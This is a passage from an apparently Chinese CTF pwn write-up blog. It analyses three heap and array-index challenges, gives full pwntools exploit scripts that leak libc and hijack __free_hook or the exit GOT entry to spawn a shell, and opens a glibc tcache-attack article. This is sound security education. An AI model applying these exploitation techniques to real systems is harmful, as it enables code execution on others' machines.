class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># 偏移测试libc版本</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># 偏移测试libc版本</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28306</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;write the note: &#x27;</span>)</span><br><span class="line">    r.sendline(content.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x50000</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libcbase = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x51000</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x50000</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-message-board"><a href="#0x04-message-board" class="headerlink" title="0x04 message_board"></a>0x04 message_board</h3><h5 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h5><p>附件给出了libc2.31的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  board();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can modify your suggestions&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input new suggestion&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    a[v4] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>board函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (**board())(<span class="type">const</span> <span class="type">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> (**result)(<span class="type">const</span> <span class="type">char</span> *); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-9Ch] BYREF</span></span><br><span class="line">  __int64 v2[<span class="number">18</span>]; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you have any suggestions for us&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2[i + <span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your suggestion is %ld\n&quot;</span>, v2[i + <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please enter the verification code&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v2);</span><br><span class="line">  result = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span> (**)(<span class="type">const</span> <span class="type">char</span> *))v2[<span class="number">0</span>] != &amp;<span class="built_in">puts</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>主函数没有return，board函数的return也没法利用，所以肯定不是ROP。看到主函数里有一个自定义数组索引的输入，很容易想到数组越界。一看a数组刚好在bss段，所以可以利用数组越界修改exit的got表为one_gadget来getshell，偏移为-28。这里需要注意一个问题是，a数组储存的数据类型是dd（DWORD），也就是四个字节，所以写libc地址的时候需要分两次写到-28和-27偏移。不用system的原因是一个是没必要，第二也没地方写binsh。</p><p>在数组越界之前，在board函数里需要绕过一个“认证”，它要求我们输入puts的libc地址，这也就要求我们泄露libc地址。这里有个知识点，scanf无返回特性，利用这个特性我们可以结合printf打印出留存在栈上的libc地址，从而通过检查，进行数组越界。下面我们讲讲这个特性。</p><h5 id="scanf无返回特性"><a href="#scanf无返回特性" class="headerlink" title="scanf无返回特性"></a>scanf无返回特性</h5><p>这个特性比较有意思。众所周知，scanf只会接收格式化字符串指定的数据，那不符合的那些输入怎么办？答案是拒之门外或者扔掉。举个例子，如果他原本要接收%d的数据，结果你输入了123abc，那它会只接收123，而abc还存在stdin中；如果输入了超出了int范围的数字就会高位截断，也就是我们常说的整数溢出；如果直接输入字母，那么他不接收任何东西，如果原本变量上已经初始化了一个值，那么这个值依然不会变，但是如果接下来有多个scanf，程序会直接全部跳过；如果输入的是单独一个‘+’或‘-’，因为这两个字符对于int来说是合法的，但是又不存在数字，所以scanf选择接收，但是不会改变变量的值。综上所述，我们只要在scanf输入加号减号就可以跳过一次输入，并且不影响下面的输入。关于scanf其他特性，可以去看C0Lin师傅的总结：<a href="https://blog.csdn.net/qq_54218833/article/details/121308367">以PWN视角看待C函数——scanf</a>。</p><p>我们看回到这道题，我们要尝试打印libc地址，栈上一般都会有libc地址留存，但是如果我们输入东西肯定会覆盖掉原本的内容，所以就需要用加减号绕过。我们先来看看原本board函数栈上的布局：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/message_board%E6%A0%88%E5%B8%83%E5%B1%80.png" alt="message_board栈布局"></p><p>v2数组从rbp-0x98（0008处）开始，所以v2[2]就是一个libc地址，所以我们只要绕过2条建议的scanf就可以拿到libc地址了。</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27152</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;./message_board&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode())))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">libc_stderr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode())</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_stderr))</span><br><span class="line">libcbase = libc_stderr-libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">libc_puts = libcbase+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>((libc_puts)))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;code\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_puts).encode())</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">libc_one = p64(one[<span class="number">1</span>]+libcbase)</span><br><span class="line">one_l = u32(libc_one[:<span class="number">4</span>])</span><br><span class="line">one_h = u32(libc_one[<span class="number">4</span>:])</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;You can modify your suggestions&quot;</span>, <span class="built_in">str</span>(-<span class="number">28</span>).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input new suggestion&quot;</span>, <span class="built_in">str</span>(one_l).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;You can modify your suggestions&quot;</span>, <span class="built_in">str</span>(-<span class="number">27</span>).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input new suggestion&quot;</span>, <span class="built_in">str</span>(one_h).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-god-of-change"><a href="#0x05-god-of-change" class="headerlink" title="0x05 god_of_change"></a>0x05 god_of_change</h3><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>菜单堆题，有add，delete和show三个功能，其中add中写content的时候存在off by one的漏洞，自然而然想到劫持size字段造成overlapping。接触了这么多堆题，不难发现，提前规划堆布局很重要，所以先来考虑getshell的方式。最简单直接的getshell方式就是劫持__free_hook执行system函数，前提是知道libc基址。这道题开了PIE，所以很难通过got表来打印出libc地址，但是slot的数量上限是32个，每个slot大小最大是0x7F，所以可以考虑通过unsortedbin来泄露libc地址。所以这道题最重要的布局其实是对于泄露libc地址进行的。</p><h5 id="利用Unsortedbin泄露libc地址"><a href="#利用Unsortedbin泄露libc地址" class="headerlink" title="利用Unsortedbin泄露libc地址"></a>利用Unsortedbin泄露libc地址</h5><p>Unsortedbin由一个循环链表来维护，如下图所示：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/unsortedbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="unsortedbin循环链表（from xswlhhh）"></p><p>而main_arena其实是一个libc地址，他在libc中与__malloc_hook函数有着固定的偏移，一般是0x10，如果有libc附件，我们就可以轻松得到libc基址。问题在于我们如何获取main_arena的地址。显然链表头（最后一个chunk）的fd和链表尾的bk（第一个chunk）都指向main_arena，如果我们能够free掉这两个chunk其中之一后依然能够打印chunk内容，我们就获得了libc地址。</p><h5 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h5><p>首先要先想办法把一个chunk放进unsortedbin中。程序中限制了申请的size不超过127，所以只能通过off by one来修改size。想要放进unsortedbin中至少要超过0x400的大小绕过tcachebin并且不能和top chunk相邻。由于每次只能改一个字节，所以需要通过chunk0修改chunk1，通过chunk1覆盖chunk2的头去改掉chunk2的size。这时候释放掉chunk2就能进unsortedbin。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%BF%9B%E5%85%A5unsortedbin.png" alt="god_of_change进入unsortedbin"></p><p>如上图会发现我还申请了很多0x80大小的chunk，是因为我需要防止修改完size的chunk2和topchunk相邻。如果相邻，那么free之后会直接被topchunk合并。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%A2%ABtopchunk%E5%90%88%E5%B9%B6.png" alt="god_of_change被topchunk合并"></p><p>接下来申请一个0x40大小的chunk，它会从chunk2中被切割下来，剩下那部分依然存在unsortedbin中。此时unsortedbin中只有一个chunk，所以他的fd和bk都是main_arena的地址。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E6%89%93%E5%8D%B0libc%E6%97%B6%E7%9A%84%E5%A0%86%E5%B8%83%E5%B1%80.png" alt="god_of_change打印libc时的堆布局"></p><p>可以看到这个地址和main_arena的偏移是0x60，所以libc的基址是泄露的地址-0x70-__malloc_hook的偏移。</p><p>接下来要劫持__free_hook为system的地址，并且要提前写入&#x2F;bin&#x2F;sh。思路是修改一个chunk的fd为hook的地址，然后申请一个相同大小的chunk就能申请到hook，然后修改其为system地址，然后立刻释放掉写有&#x2F;bin&#x2F;sh的chunk就getshell了。</p><p>我们先申请多一个0x40（总之是chunk2要一样的大小）大小的chunk，然后释放掉（chunk3）放入tcachebin中，后面用来申请到hook位置。然后释放掉之前申请的chunk2和chunk1。此时chunk1的一部分和chunk2是重叠的，所以申请chunk1大小的chunk就可以修改chunk2的fd，顺便在user_data开始处写sh，别忘了不要覆盖了chunk2的size字段。然后申请两个chunk2大小的chunk，第二个chunk就在hook地址，修改掉其指针为system。然后释放掉chunk1就getshell了。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E6%9C%80%E5%90%8E%E5%A0%86%E5%B8%83%E5%B1%80.png" alt="god_of_change最后堆布局"></p><p>通过debug找到hook的地址确认劫持成功：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%A2%AB%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84hook.png" alt="god_of_change被修改后的hook"></p><p>但是毕竟是patch过libc的可能libc的加载地址还是不太一样（上面libc地址一片空白我就觉得很奇怪了），在本地打不通，所以直接在线环境去尝试一下，是能通的。</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./god_of_change&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node5.buuoj.cn&#x27;, 25861)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;deadbeef&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0x61</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(<span class="number">0x441</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content: \n&#x27;</span>)</span><br><span class="line"><span class="comment"># print(r.recvuntil(b&#x27;\x7f&#x27;))</span></span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - \</span><br><span class="line">    <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x58</span>, flat(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x41</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">新生赛复现，主要是为了复现堆题。</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.github.io/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.github.io/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.github.io/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>『Heap Exploitation』tcache_attack</title>
    <link href="https://c-lby.github.io/2024/02/17/tcache-attack/"/>
    <id>https://c-lby.github.io/2024/02/17/tcache-attack/</id>
    <published>2024-02-17T03:52:16.000Z</published>
    <updated>2024-03-04T04:33:43.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TcacheBin-Attack"><a href="#TcacheBin-Attack" class="headerlink" title="TcacheBin Attack"></a>TcacheBin Attack</h2><p>根据源代码我们可以得知，高版本的glibc给tcachebin引入了检查机制，使得攻击没那么方便了，但正所谓道高一尺魔高一丈，没有攻不破的系统，只有不努力的黑客。tcache的检查机制主要有两个：对double free的检查和对chunk对齐的检查。前者的分析见<a href="https://c-lby.github.io/2024/02/14/glibc_tcachebin/#TcacheBin%E5%AD%98%E5%8F%96chunk">TcacheBin存取chunk</a>。这里对chunk对齐的机制进行溯源。</p><h3 id="chunk对齐检查机制"><a href="#chunk对齐检查机制" class="headerlink" title="chunk对齐检查机制"></a>chunk对齐检查机制</h3><p>tcache通过aligned_OK(e)函数来检查chunk对齐。在malloc.c第1322行有宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure><p>然后在sysdeps&#x2F;generic&#x2F;malloc-size.h里可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><p>在malloc-alignment.h里有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MALLOC_ALIGNMENT is the minimum alignment for malloc&#x27;ed chunks.  It must be a power of two at least 2 * SIZE_SZ, even on machines for which smaller alignments would suffice. It may be defined as larger than this though. Note however that code and data structures are optimized for the case of 8-byte alignment.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="meta">  ? __alignof__ (long double) : 2 * 